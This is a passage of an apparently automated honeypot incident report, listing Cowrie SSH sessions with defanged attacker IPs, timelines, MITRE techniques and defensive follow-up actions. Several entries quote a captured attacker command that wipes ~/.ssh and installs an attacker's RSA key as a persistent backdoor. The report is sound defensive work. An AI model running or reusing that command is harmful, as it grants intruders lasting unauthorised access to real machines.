| `2026-07-10 19:39:38` | `cowrie.client.version` |
| `2026-07-10 19:39:38` | `cowrie.client.kex` |
| `2026-07-10 19:39:39` | `cowrie.login.success` |
| `2026-07-10 19:39:39` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.145.203[.]68` to AbuseIPDB if not already reported
- [ ] Block `45.145.203[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee3799aebe9

| Field | Detail |
|---|---|
| **Source IP** | `218.21.250[.]151` |
| **First Seen** | 2026-07-10 19:39 |
| **Last Seen** | 2026-07-10 19:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:39:45` | `cowrie.session.connect` |
| `2026-07-10 19:39:46` | `cowrie.client.version` |
| `2026-07-10 19:39:46` | `cowrie.client.kex` |
| `2026-07-10 19:39:48` | `cowrie.login.success` |
| `2026-07-10 19:39:48` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.250[.]151` to AbuseIPDB if not already reported
- [ ] Block `218.21.250[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34dcceacddb

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-07-10 19:41 |
| **Last Seen** | 2026-07-10 19:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:41:13` | `cowrie.session.connect` |
| `2026-07-10 19:41:13` | `cowrie.client.version` |
| `2026-07-10 19:41:14` | `cowrie.client.kex` |
| `2026-07-10 19:41:15` | `cowrie.login.success` |
| `2026-07-10 19:41:16` | `cowrie.session.params` |
| `2026-07-10 19:41:16` | `cowrie.command.input` |
| `2026-07-10 19:41:16` | `cowrie.command.failed` |
| `2026-07-10 19:41:17` | `cowrie.log.closed` |
| `2026-07-10 19:41:18` | `cowrie.session.params` |
| `2026-07-10 19:41:18` | `cowrie.command.input` |
| `2026-07-10 19:41:18` | `cowrie.session.file_download` |
| `2026-07-10 19:41:18` | `cowrie.log.closed` |
| `2026-07-10 19:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b246d4087fdf

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-07-10 19:41 |
| **Last Seen** | 2026-07-10 19:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:41:19` | `cowrie.session.connect` |
| `2026-07-10 19:41:19` | `cowrie.client.version` |
| `2026-07-10 19:41:19` | `cowrie.client.kex` |
| `2026-07-10 19:41:21` | `cowrie.login.success` |
| `2026-07-10 19:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa525e001c68

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-07-10 19:41 |
| **Last Seen** | 2026-07-10 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:41:21` | `cowrie.session.connect` |
| `2026-07-10 19:41:21` | `cowrie.client.version` |
| `2026-07-10 19:41:22` | `cowrie.client.kex` |
| `2026-07-10 19:41:23` | `cowrie.login.success` |
| `2026-07-10 19:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5bc1238c792

| Field | Detail |
|---|---|
| **Source IP** | `218.146.255[.]221` |
| **First Seen** | 2026-07-10 19:41 |
| **Last Seen** | 2026-07-10 19:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:41:38` | `cowrie.session.connect` |
| `2026-07-10 19:41:39` | `cowrie.client.version` |
| `2026-07-10 19:41:39` | `cowrie.client.kex` |
| `2026-07-10 19:41:42` | `cowrie.login.success` |
| `2026-07-10 19:41:43` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.146.255[.]221` to AbuseIPDB if not already reported
- [ ] Block `218.146.255[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e19b9815c5

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-07-10 19:43 |
| **Last Seen** | 2026-07-10 19:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:43:15` | `cowrie.session.connect` |
| `2026-07-10 19:43:15` | `cowrie.client.version` |
| `2026-07-10 19:43:15` | `cowrie.client.kex` |
| `2026-07-10 19:43:16` | `cowrie.login.success` |
| `2026-07-10 19:43:16` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c83d66bcae0

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-10 19:43 |
| **Last Seen** | 2026-07-10 19:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:43:21` | `cowrie.session.connect` |
| `2026-07-10 19:43:22` | `cowrie.client.version` |
| `2026-07-10 19:43:22` | `cowrie.client.kex` |
| `2026-07-10 19:43:24` | `cowrie.login.success` |
| `2026-07-10 19:43:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862204ce8026

| Field | Detail |
|---|---|
| **Source IP** | `103.151.47[.]122` |
| **First Seen** | 2026-07-10 19:44 |
| **Last Seen** | 2026-07-10 19:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:44:01` | `cowrie.session.connect` |
| `2026-07-10 19:44:01` | `cowrie.client.version` |
| `2026-07-10 19:44:01` | `cowrie.client.kex` |
| `2026-07-10 19:44:02` | `cowrie.login.success` |
| `2026-07-10 19:44:03` | `cowrie.session.params` |
| `2026-07-10 19:44:03` | `cowrie.command.input` |
| `2026-07-10 19:44:03` | `cowrie.command.failed` |
| `2026-07-10 19:44:03` | `cowrie.log.closed` |
| `2026-07-10 19:44:04` | `cowrie.session.params` |
| `2026-07-10 19:44:04` | `cowrie.command.input` |
| `2026-07-10 19:44:04` | `cowrie.session.file_download` |
| `2026-07-10 19:44:04` | `cowrie.log.closed` |
| `2026-07-10 19:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.47[.]122` to AbuseIPDB if not already reported
- [ ] Block `103.151.47[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62ad1fb43c0

| Field | Detail |
|---|---|
| **Source IP** | `103.151.47[.]122` |
| **First Seen** | 2026-07-10 19:44 |
| **Last Seen** | 2026-07-10 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:44:05` | `cowrie.session.connect` |
| `2026-07-10 19:44:05` | `cowrie.client.version` |
| `2026-07-10 19:44:05` | `cowrie.client.kex` |
| `2026-07-10 19:44:06` | `cowrie.login.success` |
| `2026-07-10 19:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.47[.]122` to AbuseIPDB if not already reported
- [ ] Block `103.151.47[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb695ceaf6b9

| Field | Detail |
|---|---|
| **Source IP** | `103.151.47[.]122` |
| **First Seen** | 2026-07-10 19:44 |
| **Last Seen** | 2026-07-10 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:44:06` | `cowrie.session.connect` |
| `2026-07-10 19:44:06` | `cowrie.client.version` |
| `2026-07-10 19:44:06` | `cowrie.client.kex` |
| `2026-07-10 19:44:07` | `cowrie.login.success` |
| `2026-07-10 19:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.47[.]122` to AbuseIPDB if not already reported
- [ ] Block `103.151.47[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7844ca8838ec

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 19:44 |
| **Last Seen** | 2026-07-10 19:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:44:44` | `cowrie.session.connect` |
| `2026-07-10 19:44:44` | `cowrie.client.version` |
| `2026-07-10 19:44:44` | `cowrie.client.kex` |
| `2026-07-10 19:44:44` | `cowrie.login.success` |
| `2026-07-10 19:44:45` | `cowrie.session.params` |
| `2026-07-10 19:44:45` | `cowrie.command.input` |
| `2026-07-10 19:44:46` | `cowrie.log.closed` |
| `2026-07-10 19:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2c12b33969

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-10 19:46 |
| **Last Seen** | 2026-07-10 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:46:59` | `cowrie.session.connect` |
| `2026-07-10 19:46:59` | `cowrie.client.version` |
| `2026-07-10 19:46:59` | `cowrie.client.kex` |
| `2026-07-10 19:46:59` | `cowrie.login.success` |
| `2026-07-10 19:47:00` | `cowrie.session.params` |
| `2026-07-10 19:47:00` | `cowrie.command.input` |
| `2026-07-10 19:47:00` | `cowrie.command.failed` |
| `2026-07-10 19:47:00` | `cowrie.log.closed` |
| `2026-07-10 19:47:01` | `cowrie.session.params` |
| `2026-07-10 19:47:01` | `cowrie.command.input` |
| `2026-07-10 19:47:01` | `cowrie.session.file_download` |
| `2026-07-10 19:47:01` | `cowrie.log.closed` |
| `2026-07-10 19:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97fab65aec5f

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-10 19:47 |
| **Last Seen** | 2026-07-10 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:47:01` | `cowrie.session.connect` |
| `2026-07-10 19:47:01` | `cowrie.client.version` |
| `2026-07-10 19:47:01` | `cowrie.client.kex` |
| `2026-07-10 19:47:01` | `cowrie.login.success` |
| `2026-07-10 19:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9906752bb46

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-10 19:47 |
| **Last Seen** | 2026-07-10 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:47:01` | `cowrie.session.connect` |
| `2026-07-10 19:47:01` | `cowrie.client.version` |
| `2026-07-10 19:47:01` | `cowrie.client.kex` |
| `2026-07-10 19:47:01` | `cowrie.login.success` |
| `2026-07-10 19:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44284f4f922b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 19:48 |
| **Last Seen** | 2026-07-10 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:48:59` | `cowrie.session.connect` |
| `2026-07-10 19:48:59` | `cowrie.client.version` |
| `2026-07-10 19:48:59` | `cowrie.client.kex` |
| `2026-07-10 19:49:00` | `cowrie.login.success` |
| `2026-07-10 19:49:00` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:49:00` | `cowrie.direct-tcpip.data` |
| `2026-07-10 19:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ae68f518e0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 19:52 |
| **Last Seen** | 2026-07-10 19:52 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:52:15` | `cowrie.session.connect` |
| `2026-07-10 19:52:17` | `cowrie.client.version` |
| `2026-07-10 19:52:17` | `cowrie.client.kex` |
| `2026-07-10 19:52:25` | `cowrie.login.success` |
| `2026-07-10 19:52:29` | `cowrie.session.params` |
| `2026-07-10 19:52:29` | `cowrie.command.input` |
| `2026-07-10 19:52:31` | `cowrie.log.closed` |
| `2026-07-10 19:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ea2e6ad630

| Field | Detail |
|---|---|
| **Source IP** | `161.248.201[.]12` |
| **First Seen** | 2026-07-10 19:55 |
| **Last Seen** | 2026-07-10 19:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:55:58` | `cowrie.session.connect` |
| `2026-07-10 19:55:58` | `cowrie.client.version` |
| `2026-07-10 19:55:58` | `cowrie.client.kex` |
| `2026-07-10 19:55:59` | `cowrie.login.success` |
| `2026-07-10 19:56:00` | `cowrie.session.params` |
| `2026-07-10 19:56:00` | `cowrie.command.input` |
| `2026-07-10 19:56:00` | `cowrie.command.failed` |
| `2026-07-10 19:56:01` | `cowrie.log.closed` |
| `2026-07-10 19:56:02` | `cowrie.session.params` |
| `2026-07-10 19:56:02` | `cowrie.command.input` |
| `2026-07-10 19:56:02` | `cowrie.session.file_download` |
| `2026-07-10 19:56:02` | `cowrie.log.closed` |
| `2026-07-10 19:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.201[.]12` to AbuseIPDB if not already reported
- [ ] Block `161.248.201[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ab00370eaf

| Field | Detail |
|---|---|
| **Source IP** | `161.248.201[.]12` |
| **First Seen** | 2026-07-10 19:56 |
| **Last Seen** | 2026-07-10 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:56:02` | `cowrie.session.connect` |
| `2026-07-10 19:56:02` | `cowrie.client.version` |
| `2026-07-10 19:56:03` | `cowrie.client.kex` |
| `2026-07-10 19:56:04` | `cowrie.login.success` |
| `2026-07-10 19:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.201[.]12` to AbuseIPDB if not already reported
- [ ] Block `161.248.201[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d546bc4c46

| Field | Detail |
|---|---|
| **Source IP** | `161.248.201[.]12` |
| **First Seen** | 2026-07-10 19:56 |
| **Last Seen** | 2026-07-10 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:56:04` | `cowrie.session.connect` |
| `2026-07-10 19:56:04` | `cowrie.client.version` |
| `2026-07-10 19:56:05` | `cowrie.client.kex` |
| `2026-07-10 19:56:06` | `cowrie.login.success` |
| `2026-07-10 19:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.201[.]12` to AbuseIPDB if not already reported
- [ ] Block `161.248.201[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c32aa4ba1c

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-10 19:57 |
| **Last Seen** | 2026-07-10 19:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:57:06` | `cowrie.session.connect` |
| `2026-07-10 19:57:06` | `cowrie.client.version` |
| `2026-07-10 19:57:06` | `cowrie.client.kex` |
| `2026-07-10 19:57:07` | `cowrie.login.success` |
| `2026-07-10 19:57:08` | `cowrie.session.params` |
| `2026-07-10 19:57:08` | `cowrie.command.input` |
| `2026-07-10 19:57:08` | `cowrie.command.failed` |
| `2026-07-10 19:57:08` | `cowrie.log.closed` |
| `2026-07-10 19:57:09` | `cowrie.session.params` |
| `2026-07-10 19:57:09` | `cowrie.command.input` |
| `2026-07-10 19:57:09` | `cowrie.session.file_download` |
| `2026-07-10 19:57:09` | `cowrie.log.closed` |
| `2026-07-10 19:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2b413066cb

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-10 19:57 |
| **Last Seen** | 2026-07-10 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:57:10` | `cowrie.session.connect` |
| `2026-07-10 19:57:10` | `cowrie.client.version` |
| `2026-07-10 19:57:10` | `cowrie.client.kex` |
| `2026-07-10 19:57:11` | `cowrie.login.success` |
| `2026-07-10 19:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a9458cb9bf

| Field | Detail |
|---|---|
